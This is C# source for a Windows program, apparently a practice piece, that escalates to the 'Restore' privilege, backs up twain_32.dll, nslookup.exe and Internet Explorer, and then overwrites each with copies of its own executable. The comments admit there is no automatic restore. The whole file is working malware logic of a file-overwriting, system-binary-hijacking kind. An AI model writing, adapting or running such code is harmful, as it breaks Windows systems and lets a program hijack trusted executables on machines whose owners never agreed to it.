using System;
using System.Text;

namespace voileapp
{
    class Program
    {
        // names of the files that'd be a subject to work with
        private const String TWAIN32_NAME = "twain_32.dll";
        private const String NSLOOKUP_NAME = "nslookup.exe";
        private const String IEXPLORE_NAME = "iexplore.exe";
        // also the MS Internet Explorer folder name
        private const String IEXPLORE_DIR = "Internet Explorer";

        static void Main(string[] args)
        {
            // Some system paths taken from environment variables
            String sysRoot = Environment.ExpandEnvironmentVariables("%SystemRoot%");
            String sysDir = Environment.SystemDirectory;
            String programFilesDir = Environment.ExpandEnvironmentVariables("%ProgramFiles%");
            
            // Now all the patchs are composed into the absolute form via StringBuilder
            StringBuilder pathToTwain32 = new StringBuilder(sysRoot).Append("\\").Append(TWAIN32_NAME);
            StringBuilder pathToNslookup = new StringBuilder(sysDir).Append("\\").Append(NSLOOKUP_NAME);
            StringBuilder pathToIexplore = new StringBuilder(programFilesDir).Append("\\").Append(IEXPLORE_DIR)
                .Append("\\").Append(IEXPLORE_NAME);

            // Sometimes it requires 'Restore' privilege for the user to manipulate on certain files
            Privileges.GiveRestorePrivilege();

            /**
             * First, store the files of interest in backup folder
             * Then copy THIS executive to those file's location...
             * ...deleting the original ones
             * Beware, the automatical backup restore isn't included
             * 
             * The exceptions handling is sparse due to the nature of the ultimate program's predestination
             * It's practice.
             **/
            try
            {
                // It's possible to specify the name of the saved file
                Backup.MakeBackup(pathToTwain32.ToString(), TWAIN32_NAME);
                Backup.MakeBackup(pathToNslookup.ToString(), NSLOOKUP_NAME);
                Backup.MakeBackup(pathToIexplore.ToString(), IEXPLORE_NAME);

                FileCopy.CopyExecutive(pathToTwain32.ToString());
                FileCopy.CopyExecutive(pathToNslookup.ToString());
                FileCopy.CopyExecutive(pathToIexplore.ToString());
            } catch (UnauthorizedAccessException e)
            {
                // There's only one exception's explicit handling
                Console.WriteLine("Unauthorized access!");
                Console.WriteLine(e.StackTrace);
            }

        }
    }
}
